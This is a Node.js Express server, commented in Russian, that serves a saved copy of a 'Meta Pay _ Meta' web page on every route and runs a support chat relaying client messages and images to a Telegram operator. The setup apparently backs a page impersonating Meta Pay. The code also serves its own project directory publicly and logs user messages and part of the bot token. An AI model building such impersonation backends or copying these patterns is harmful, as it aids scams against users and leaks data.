const express = require('express');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');
const multer = require('multer');
const { initDatabase, saveMessage, getMessages, fixNullMessageFrom } = require('./database');
const TelegramSupportBot = require('./telegramBot');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Настройка multer для загрузки изображений
const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 5 * 1024 * 1024 } // 5MB
});

// Раздаем статические файлы из корневой директории
app.use(express.static(__dirname));

// Раздаем файлы из папки Meta Pay _ Meta_files
app.use('/Meta Pay _ Meta_files', express.static(path.join(__dirname, 'Meta Pay _ Meta_files')));

// Инициализация базы данных и Telegram бота
let db;
let telegramBot;

(async () => {
    try {
        console.log('🔄 Начало инициализации базы данных...');
        // Инициализируем БД
        db = await initDatabase();
        
        if (!db) {
            console.error('❌ КРИТИЧЕСКАЯ ОШИБКА: initDatabase() вернул undefined или null');
            return;
        }
        
        console.log('✅ База данных успешно инициализирована');
        console.log(`📊 Тип БД: ${process.env.DATABASE_URL && process.env.DATABASE_URL.startsWith('postgresql://') ? 'PostgreSQL' : 'SQLite'}`);
        console.log(`📊 db объект:`, db ? (db.query ? 'PostgreSQL Client' : 'SQLite Database') : 'undefined');
        
        // Исправляем все существующие записи с NULL значениями
        try {
            await fixNullMessageFrom(db);
        } catch (fixError) {
            console.error('⚠️ Ошибка при исправлении NULL значений при инициализации:', fixError.message);
        }
        
        // Инициализируем Telegram бота (если токен указан)
        const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
        const operatorChatId = process.env.TELEGRAM_OPERATOR_CHAT_ID;
        
        console.log(`🔍 ПРОВЕРКА TELEGRAM ПЕРЕМЕННЫХ:`);
        console.log(`   TELEGRAM_BOT_TOKEN: ${telegramToken ? `установлен (${telegramToken.substring(0, 10)}...)` : 'НЕ УСТАНОВЛЕН'}`);
        console.log(`   TELEGRAM_OPERATOR_CHAT_ID: ${operatorChatId || 'НЕ УСТАНОВЛЕН'}`);
        
        if (telegramToken && operatorChatId) {
            telegramBot = new TelegramSupportBot(telegramToken, operatorChatId, db);
            console.log('✅ Telegram бот запущен');
            console.log(`📱 Operator Chat ID: ${operatorChatId}`);
        } else {
            console.error('❌ КРИТИЧЕСКАЯ ОШИБКА: Telegram бот не настроен!');
            console.error(`   TELEGRAM_BOT_TOKEN: ${telegramToken ? 'OK' : 'ОТСУТСТВУЕТ'}`);
            console.error(`   TELEGRAM_OPERATOR_CHAT_ID: ${operatorChatId ? 'OK' : 'ОТСУТСТВУЕТ'}`);
            console.warn('⚠️ Telegram бот не настроен. Установите TELEGRAM_BOT_TOKEN и TELEGRAM_OPERATOR_CHAT_ID');
        }
    } catch (error) {
        console.error('❌ КРИТИЧЕСКАЯ ОШИБКА инициализации:', error);
        console.error('❌ Стек ошибки:', error.stack);
        db = null; // Явно устанавливаем null при ошибке
    }
})();

// API: Отправка текстового сообщения
app.post('/api/support/sendMessage', async (req, res) => {
    try {
        if (!db) {
            return res.status(503).json({ error: 'База данных не инициализирована' });
        }
        
        const { supportToken, message } = req.body;
        
        if (!supportToken || !message) {
            return res.status(400).json({ error: 'supportToken и message обязательны' });
        }

        console.log(`📤 Сообщение от клиента. Токен: ${supportToken}, Сообщение: "${message}"`);

        // Сохраняем сообщение в БД
        const savedMessage = await saveMessage(db, supportToken, message, null, 1);
        console.log(`✅ Сообщение сохранено в БД с ID: ${savedMessage.id}`);
        
        // Отправляем оператору в Telegram
        if (telegramBot) {
            await telegramBot.sendToOperator(supportToken, message);
            console.log(`📱 Сообщение отправлено в Telegram для токена: ${supportToken}`);
        } else {
            console.warn(`⚠️ Telegram бот не настроен, сообщение не отправлено оператору`);
        }

        res.json({ success: true, messageId: savedMessage.id });
    } catch (error) {
        console.error('❌ Ошибка отправки сообщения:', error);
        res.status(500).json({ error: 'Ошибка отправки сообщения' });
    }
});

// API: Отправка изображения
app.post('/api/support/sendImage', upload.single('image'), async (req, res) => {
    try {
        if (!db) {
            return res.status(503).json({ error: 'База данных не инициализирована' });
        }
        
        const { supportToken } = req.body;
        const file = req.file;

        if (!supportToken || !file) {
            return res.status(400).json({ error: 'supportToken и image обязательны' });
        }

        // Конвертируем изображение в base64 для хранения
        const imageBase64 = `data:${file.mimetype};base64,${file.buffer.toString('base64')}`;
        
        // Сохраняем сообщение с изображением в БД
        const savedMessage = await saveMessage(db, supportToken, null, imageBase64, 1);
        
        // Отправляем оператору в Telegram
        if (telegramBot) {
            // Отправляем изображение как Buffer
            await telegramBot.sendToOperator(supportToken, '[Изображение]', file.buffer);
        }

        res.json({ success: true, messageId: savedMessage.id });
    } catch (error) {
        console.error('Ошибка отправки изображения:', error);
        res.status(500).json({ error: 'Ошибка отправки изображения' });
    }
});

// API: Получение всех сообщений
app.post('/api/support/getMessages1', async (req, res) => {
    try {
        if (!db) {
            return res.status(503).json({ error: 'База данных не инициализирована' });
        }
        
        const { supportToken } = req.body;
        
        if (!supportToken) {
            return res.status(400).json({ error: 'supportToken обязателен' });
        }

        console.log(`📥 Запрос сообщений для токена: ${supportToken}`);
        
        // Получаем все сообщения из БД
        const messages = await getMessages(db, supportToken);
        
        console.log(`📨 Найдено сообщений для токена ${supportToken}: ${messages.length}`);
        
        // Детальное логирование ВСЕХ сообщений перед обработкой
        console.log(`🔍 ДЕТАЛЬНАЯ ПРОВЕРКА всех сообщений для токена ${supportToken}:`);
        messages.forEach((m, idx) => {
            console.log(`  [${idx}] ID=${m.id}, messageFrom=${m.messageFrom} (тип: ${typeof m.messageFrom}, значение: ${JSON.stringify(m.messageFrom)}), message="${m.message?.substring(0, 30) || '[изображение]'}"`);
        });
        
        if (messages.length > 0) {
            console.log(`Последние сообщения:`, messages.slice(-3).map(m => ({
                id: m.id,
                from: m.messageFrom === 1 ? 'клиент' : (m.messageFrom === 0 ? 'оператор' : `НЕИЗВЕСТНО(${m.messageFrom})`),
                message: m.message ? m.message.substring(0, 50) : '[изображение]'
            })));
        }
        
        // Убеждаемся, что messageFrom всегда число и валидируем
        const formattedMessages = messages
            .map(m => {
                // Обработка NULL или undefined
                let messageFrom = m.messageFrom;
                if (messageFrom === null || messageFrom === undefined) {
                    console.error(`❌ КРИТИЧЕСКАЯ ОШИБКА: messageFrom = NULL для сообщения ID=${m.id}, токен=${supportToken}`);
                    messageFrom = 1; // По умолчанию клиент для старых записей
                }
                
                const messageFromNum = parseInt(messageFrom, 10);
                if (isNaN(messageFromNum) || (messageFromNum !== 0 && messageFromNum !== 1)) {
                    console.error(`❌ КРИТИЧЕСКАЯ ОШИБКА: Некорректный messageFrom в БД: ${m.messageFrom} (тип: ${typeof m.messageFrom}) для сообщения ID=${m.id}`);
                    // Исправляем некорректные данные - устанавливаем 1 (клиент) по умолчанию
                    return {
                        id: m.id,
                        message: m.message,
                        image: m.image,
                        messageFrom: 1, // Исправляем на клиента
                        createdAt: m.createdAt
                    };
                }
                
                // ВАЖНО: Сохраняем правильное значение (0 для оператора, 1 для клиента)
                const result = {
                    id: m.id,
                    message: m.message,
                    image: m.image,
                    messageFrom: messageFromNum, // Гарантированно число: 0 или 1
                    createdAt: m.createdAt
                };
                
                // Логируем сообщения от оператора для отладки
                if (messageFromNum === 0) {
                    console.log(`✅ ОПЕРАТОР: ID=${m.id}, message="${m.message?.substring(0, 30) || '[изображение]'}"`);
                }
                
                return result;
            })
            .filter(m => m.messageFrom === 0 || m.messageFrom === 1); // Фильтруем только валидные
        
        console.log(`📤 Отправка ${formattedMessages.length} сообщений клиенту для токена ${supportToken}`);
        
        // Дополнительная проверка: есть ли сообщения от оператора
        const operatorMessages = formattedMessages.filter(m => m.messageFrom === 0);
        const clientMessages = formattedMessages.filter(m => m.messageFrom === 1);
        console.log(`📊 Статистика для токена ${supportToken}: ${clientMessages.length} от клиента, ${operatorMessages.length} от оператора`);
        
        if (operatorMessages.length > 0) {
            console.log(`✅ Сообщения от оператора найдены (${operatorMessages.length} шт.):`, operatorMessages.map(m => ({
                id: m.id,
                messageFrom: m.messageFrom,
                message: m.message?.substring(0, 50) || '[изображение]'
            })));
        } else {
            console.warn(`⚠️ ВНИМАНИЕ: Нет сообщений от оператора для токена ${supportToken}!`);
        }
        
        // Проверяем, что все messageFrom правильные
        const invalidMessages = formattedMessages.filter(m => m.messageFrom !== 0 && m.messageFrom !== 1);
        if (invalidMessages.length > 0) {
            console.error(`❌ КРИТИЧЕСКАЯ ОШИБКА: Найдены сообщения с некорректным messageFrom:`, invalidMessages);
        }
        
        res.json({ 
            success: true, 
            messages: formattedMessages
        });
    } catch (error) {
        console.error('Ошибка получения сообщений:', error);
        res.status(500).json({ error: 'Ошибка получения сообщений' });
    }
});

// Обработка корневого маршрута - отдаем главный HTML файл
app.get('/', (req, res) => {
    const filePath = path.join(__dirname, 'Meta Pay _ Meta.html');
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.status(404).send('Файл не найден: Meta Pay _ Meta.html');
    }
});

// Обработка всех остальных маршрутов
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'Meta Pay _ Meta.html'));
});

app.listen(PORT, () => {
    console.log(`Сервер запущен на http://localhost:${PORT}`);
    console.log(`Откройте браузер и перейдите по адресу: http://localhost:${PORT}`);
});
